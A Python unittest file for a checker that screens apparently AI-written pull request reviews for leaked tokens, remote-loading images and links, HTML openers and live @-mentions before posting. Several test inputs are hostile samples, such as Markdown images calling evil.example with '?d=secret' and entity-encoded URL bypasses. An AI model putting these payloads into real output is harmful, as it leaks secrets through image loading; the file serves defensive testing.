"""Tests of check.py, run with test_kind.py."""

import base64
import hashlib
import random
import unittest
from pathlib import Path

from check import comment, hashed_names, leaks, problem, scrub, verdicts

HEAD = "b" * 40
OK = f"Review of {HEAD}: no blocking issues"
BAD = f"Review of {HEAD}: blocking issues"
SECRET = "sk-ant-oat01-Zq3x9KfL2mPw7RtY5vBn8HjC4dGs6AeU1oIk0"
# Every review says which probes it ran and which it could not.
PROBED = "\n\nProbes: ran `fren check a.fren` (`.review/probes.md`); could not run `ui`, which needs a rebuild."


class Problem(unittest.TestCase):
    def test_clean(self):
        text = f"{OK}\n\n1. **[non-blocking, fix before merge]** `a.md:3`. Wording.{PROBED}"
        self.assertIsNone(problem(text, HEAD, "full"))

    def test_blocking(self):
        text = f"{BAD}\n\n1. [blocking] x\n2. [non-blocking] y{PROBED}"
        self.assertIsNone(problem(text, HEAD, "full"))

    def test_probes_required(self):
        self.assertIsNotNone(problem(f"{OK}\n\n1. [non-blocking] x", HEAD, "full"))
        self.assertIsNotNone(problem(f"{OK}\n\nNo probes were needed.", HEAD, "full"))
        for line in ("Probes: none ran.", "**Probes:** ran one.", "**Probes**: ran one.", "_Probes:_ ran one."):
            self.assertIsNone(problem(f"{OK}\n\n{line}", HEAD, "full"), line)

    def test_light_verdict_only_for_light_checks(self):
        self.assertIsNone(problem(f"{OK} (fixes only){PROBED}", HEAD, "fixes"))
        self.assertIsNotNone(problem(f"{OK} (fixes only)", HEAD, "full"))
        self.assertIsNotNone(problem(f"{OK} (rebase only)", HEAD, "fixes"))

    def test_verdicts_share_the_prefix(self):
        self.assertTrue(all(v.startswith(f"Review of {HEAD}: ") for v in verdicts(HEAD, "rebase")))

    def test_verdict_disagrees_with_findings(self):
        self.assertIsNotNone(problem(f"{OK}\n\n1. [blocking] x", HEAD, "full"))
        self.assertIsNotNone(problem(f"{BAD}\n\n1. [non-blocking] x", HEAD, "full"))
        self.assertIsNotNone(problem(BAD, HEAD, "full"))

    def test_unmarked_or_doubly_marked_finding(self):
        self.assertIsNotNone(problem(f"{OK}\n\n1. Wording.", HEAD, "full"))
        self.assertIsNotNone(problem(f"{OK}\n\n1. [non-blocking] [blocking] x", HEAD, "full"))

    def test_strict_marks(self):
        for mark in ("[blockingly]", "[non-blocking-ish]", "[blocking, maybe]", "[Blocking]"):
            self.assertIsNotNone(problem(f"{BAD}\n\n1. {mark} x", HEAD, "full"), mark)
            self.assertIsNotNone(problem(f"{OK}\n\n1. {mark} x", HEAD, "full"), mark)

    def test_nested_items_need_no_mark(self):
        self.assertIsNone(problem(f"{OK}\n\n1. [non-blocking] x:\n   1. a step\n   2. another{PROBED}", HEAD, "full"))

    def test_other_head(self):
        self.assertIsNotNone(problem("Review of " + "c" * 40 + ": no blocking issues", HEAD, "full"))

    def test_token(self):
        self.assertIsNotNone(problem(f"{OK}\n\nsk-ant-oat01-abcdefghijkl", HEAD, "full"))
        self.assertIsNotNone(problem(f"{OK}\n\nghs_" + "a" * 36, HEAD, "full"))

    def test_remote_loading(self):
        for text in ("![x](https://example.com/p.png?d=1)", "![x](/relative.png)", "![x][ref]",
                     '<img src="https://example.com/p.png">', "<https://example.com/?d=1>",
                     "[x](http://example.com)", "see https://evil.example/?d=1",
                     "[x](https://github.com.evil.example/)",
                     # A shortcut reference image, with an entity, or a
                     # protocol-relative destination, in its definition.
                     "See ![logo] here.\n\n[logo]: h&#116;tps://evil.example/x.png",
                     "See ![logo] here.\n\n[logo]: //evil.example/x.png",
                     "See [logo] here.\n\n[logo]: h&#116;tps://evil.example/x.png",
                     "See [logo] here.\n\n[logo]: //evil.example/x.png",
                     "[x](//evil.example/a)", "[x](h&#x74;tp://evil.example)",
                     "[x](h&amp;#116;tps://evil.example)", "x<img src=//evil.example/p>"):
            self.assertIsNotNone(problem(f"{OK}\n\n{text}{PROBED}", HEAD, "full"), text)

    def test_github_links(self):
        for text in ("[#670](https://github.com/langston-barrett/fren/pull/670)",
                     "[docs](https://docs.github.com/en/actions)", "[x](//github.com/a)",
                     "a // comment, and `x // y`", "`a < b` and 3 < 4",
                     # Fren's type applications.
                     "`Set<Role>`, `Set<Set<Role>>` and `Rel<Role, Role>`"):
            self.assertIsNone(problem(f"{OK}\n\n{text}{PROBED}", HEAD, "full"), text)

    def test_findings_that_escape_the_column(self):
        # Markdown renders each as a numbered item, so each is a finding.
        for line in (" 1. [blocking] x", "  1. [blocking] x", "1.[blocking] x", "1) [blocking] x"):
            self.assertIsNotNone(problem(f"{OK}\n\n{line}{PROBED}", HEAD, "full"), line)
            self.assertIsNone(problem(f"{BAD}\n\n{line}{PROBED}", HEAD, "full"), line)

    def test_no_blocking_mark_under_a_clean_verdict(self):
        # Even where no finding is recognized, such as an item indented
        # three spaces.
        self.assertIsNotNone(problem(f"{OK}\n\n   1. [blocking] x{PROBED}", HEAD, "full"))
        self.assertIsNotNone(problem(f"{OK}\n\nA [blocking] point.{PROBED}", HEAD, "full"))


class Leaks(unittest.TestCase):
    def test_copies(self):
        part = SECRET.split("-")[-1]
        for text in (SECRET, " ".join(SECRET), SECRET[::-1], SECRET.encode().hex(),
                     SECRET.encode().hex().upper(), base64.b64encode(SECRET.encode()).decode(),
                     base64.b64encode(("xy" + SECRET).encode()).decode(),
                     base64.b64encode(part[3:].encode()).decode(), part[5:25],
                     "\n".join(part[i:i + 4] for i in range(0, len(part), 4))):
            self.assertTrue(leaks(f"Review\n\n{text}\n", [SECRET]), text)

    def test_no_copy(self):
        self.assertFalse(leaks(f"{OK}\n\n1. [non-blocking] Wording of sk-ant- tokens.", [SECRET, ""]))


class Comment(unittest.TestCase):
    def posted(self, case):
        text = f"{OK}\n\n{case}{PROBED}"
        body, ok = comment(text, HEAD, "full", "URL", set())
        self.assertTrue(ok, case)
        return body

    def test_every_opener_is_replaced_in_every_context(self):
        cases = [
            "<old head>", "`<old head>`", "``a ` <old head>``",
            "```text\n<old head>\n```", "~~~\n<old head>\n~~~",
            "```\r\n<old head>\r\n```", "```\n<old head>",
            "<sha> and </details>, <!-- hidden -->, <?xml?>, and a < b",
            "Set<Role>, Set<Set<Role>>, Rel<Role, Role>, and `Set<Role>`",
            "`<old head>", "``<old head>`", r"\`<old head>`",
            "| a | b |\n| --- | --- |\n| `x|<old head>` |",
        ]
        for indent in range(1, 4):
            for fence in ("```", "~~~"):
                cases += [f"{' ' * indent}{fence}\n<old head>\n{fence}",
                          f"{' ' * indent}{fence}\na\n\n{fence}\n<old head>"]
        for case in cases:
            with self.subTest(case=case):
                body = self.posted(case)
                self.assertNotIn("<", body)
                self.assertIn("＜", body)
                self.assertEqual(body, f"{OK}\n\n{case.replace('<', '＜')}{PROBED}\n")

    def test_markdown_images_are_refused_even_in_code(self):
        for content in ("![x](y)", "![x][ref]", "![x]", "&#33;[x](y)"):
            for case in (content, f"`{content}`", f"```\n{content}\n```", f"~~~\n{content}\n~~~"):
                body, ok = comment(f"{OK}\n\n{case}{PROBED}", HEAD, "full", "URL", set())
                self.assertFalse(ok, case)
                self.assertIn("it holds a Markdown image", body, case)
                self.assertNotIn(content, body, case)

    def test_loading_tag_placeholders_are_neutralized(self):
        case = "Quote `<img src=x>` and `<link>` as placeholders."
        expected = "Quote `＜img src=x>` and `＜link>` as placeholders."
        self.assertEqual(self.posted(case), f"{OK}\n\n{expected}{PROBED}\n")
        for tag in ("<img src=x>", "<link>", "<script>x</script>", "<svg>",
                    "`Set<img src=x>`", "a<Picture>", "&lt;img src=x&gt;"):
            self.assertEqual(self.posted(tag), f"{OK}\n\n{tag.replace('<', '＜')}{PROBED}\n", tag)

    def test_lean_assumption_notation_is_preserved(self):
        case = "`simp_wf) <;> (try have := ‹_ ∈ fs›)`"
        expected = "`simp_wf) ＜;> (try have := ‹_ ∈ fs›)`"
        self.assertEqual(self.posted(case), f"{OK}\n\n{expected}{PROBED}\n")

    def test_previously_withheld_review_posts(self):
        # Exact review of this PR's 6a6f3905 head, withheld for quoting tags.
        fixture = Path(__file__).with_name("fixtures") / "review-6a6f3905.md"
        text = fixture.read_text(encoding="utf-8")
        head = "6a6f39053846ef29abbf6ca430387b545564f0de"
        body, ok = comment(text, head, "full", "https://github.com/runs/1", set())
        self.assertTrue(ok)
        self.assertTrue(body.startswith(f"Review of {head}: no blocking issues\n"))
        self.assertNotIn("<", body)
        self.assertIn("＜", body)

    def test_entities_are_not_decoded(self):
        case = "&lt;old head>, &#60;sha>, &#x3c;sha>, &amp;lt;sha>, and &lt;<old head>."
        expected = "&lt;old head>, &#60;sha>, &#x3c;sha>, &amp;lt;sha>, and &lt;＜old head>."
        self.assertEqual(self.posted(case), f"{OK}\n\n{expected}{PROBED}\n")

    def test_generated_comments_contain_no_openers(self):
        rng = random.Random(0)
        fragments = ["<", "<old head>", "<details>", "</summary>", "<!-- -->", "<?xml?>",
                     "Set<Role>", "`", "``", "```", "~~~", "|", "\\", "\n", "\r\n",
                     " ", "   ", "[", "](", "]:", "&lt;", "&#60;", "＜", "‹_›", "x",
                     "<img src=x>", "<link>", "![x](y)", "https://outside.example/x",
                     "sk-ant-oat01-abcdefghijkl"]
        outcomes = set()
        for i in range(1000):
            case = "".join(rng.choices(fragments, k=rng.randrange(1, 30)))
            text = f"{OK}\n\n{case}{PROBED}" if i % 2 else case
            body, ok = comment(text, HEAD, "full", "https://github.com/runs/1?head=<sha>", set())
            outcomes.add(ok)
            with self.subTest(i=i, case=case):
                self.assertNotIn("<", body)
        self.assertEqual(outcomes, {True, False})

    def test_fallback_note_contains_no_openers(self):
        body, ok = comment("", "<head>", "full", "https://outside.example/run", set())
        self.assertFalse(ok)
        self.assertNotIn("outside.example", body)
        self.assertNotIn("<", body)
        self.assertIn("＜head>", body)

    def test_scrub(self):
        self.assertEqual(scrub("ran on Box-1 and box-1.", {"box-1"}), "ran on a machine and a machine.")
        self.assertEqual(scrub("boxes", {"box"}), "boxes")

    def test_scrub_by_hash(self):
        hashes = {hashlib.sha256(b"quokka").hexdigest()}
        self.assertEqual(scrub("On Quokka, or (quokka)'s disk: quokkas.", set(), hashes),
                         "On a machine, or (a machine)'s disk: quokkas.")

    def test_hashed_names_are_hashes(self):
        names = hashed_names()
        self.assertTrue(names)
        self.assertTrue(all(len(h) == 64 and int(h, 16) >= 0 for h in names))

    def test_failure_is_no_review(self):
        body, ok = comment("", HEAD, "full", "URL", set())
        self.assertFalse(ok)
        self.assertFalse(body.startswith("Review of"))

    def test_failure_note_quotes_nothing(self):
        # A first line that is not a verdict, which would have been quoted.
        hostile = "x` ![a](https://evil.example/p.png?d=secret) `y @someone"
        for text in (f"{hostile}\n\n{PROBED}", f"{OK}\n\n1. {hostile}{PROBED}",
                     f"{OK}\n\n[x](https://evil.example/{hostile}){PROBED}"):
            body, ok = comment(text, HEAD, "full", "URL", set())
            self.assertFalse(ok)
            for part in ("evil", "![", "someone", "secret"):
                self.assertNotIn(part, body, text)

    def test_posted_comment_mentions_no_one(self):
        body, ok = comment(f"{OK}\n\nAsk @someone, or @org/team.{PROBED}", HEAD, "full", "URL", set())
        self.assertTrue(ok)
        self.assertNotRegex(body, r"@[A-Za-z0-9_-]")
        self.assertIn("@\u200bsomeone", body)
        # Lean's attributes stay as they are.
        body, _ = comment(f"{OK}\n\nThe `@[simp]` lemma.{PROBED}", HEAD, "full", "URL", set())
        self.assertIn("`@[simp]`", body)

    def test_entity_mentions(self):
        # Markdown decodes each to `@`, so each would mention someone.
        for at in ("&#64;", "&#064;", "&#x40;", "&#X40;", "&commat;"):
            body, ok = comment(f"{OK}\n\nAsk {at}someone, or {at}&#115;omeone.{PROBED}", HEAD, "full", "URL", set())
            self.assertTrue(ok, at)
            self.assertNotIn(f"{at}s", body, at)
            self.assertNotIn(f"{at}&", body, at)
            self.assertEqual(body.count("@\u200b"), 2, at)

    def test_code_is_defused_too(self):
        # Every `@` before a name is defused, in code as well, since telling
        # code from text took a guess that once let a mention through.
        text = (f"{OK}\n\nIn `@someone` and ``a ` @other``, and\n\n```lean\ntheorem x := @foo\n```\n\n"
                f"~~~~\n@bar\n~~~~\n\nbut @outside.{PROBED}")
        body, ok = comment(text, HEAD, "full", "URL", set())
        self.assertTrue(ok)
        self.assertNotRegex(body, r"@(?!\u200b)[A-Za-z0-9_-]")
        for name in ("someone", "other", "foo", "bar", "outside"):
            self.assertIn(f"@\u200b{name}", body, name)

    def test_checkers_bypasses(self):
        # The four inputs with which the check of 333712e0 got a live
        # mention past the code exemption: each is text in CommonMark.
        for case in ("- ```\n  x\n  ```\n\nthen @someone here",
                     "- a\n\n  ```\n  x\n- b @someone",
                     'x<span title="`">@someone x<span title="`">',
                     "see x<https://github.com/`>@someone `"):
            body, _ = comment(f"{OK}\n\n{case}{PROBED}", HEAD, "full", "URL", set())
            self.assertNotRegex(body, r"@(?!\u200b)[A-Za-z0-9_-]", case)
            self.assertNotIn("@someone", body, case)

    def test_posted_comment_is_checked_as_posted(self):
        # The run's URL is the only thing a note links to, and a run URL
        # outside github.com is caught too.
        body, ok = comment("", HEAD, "full", "https://evil.example/run", set())
        self.assertFalse(ok)
        self.assertNotIn("evil", body)

    def test_review_without_openers_is_posted_as_written(self):
        # The comment counts as the review, so it is the review itself,
        # with no note added.
        body, ok = comment(OK + PROBED, HEAD, "full", "URL", set())
        self.assertTrue(ok)
        self.assertEqual(body, OK + PROBED + "\n")
        case = ("1. [non-blocking] `src/a.lean:3`: check `Role` with `a ≤ b`.\n\n"
                "See [the code](https://github.com/langston-barrett/fren).")
        self.assertEqual(self.posted(case), f"{OK}\n\n{case}{PROBED}\n")


if __name__ == "__main__":
    unittest.main()
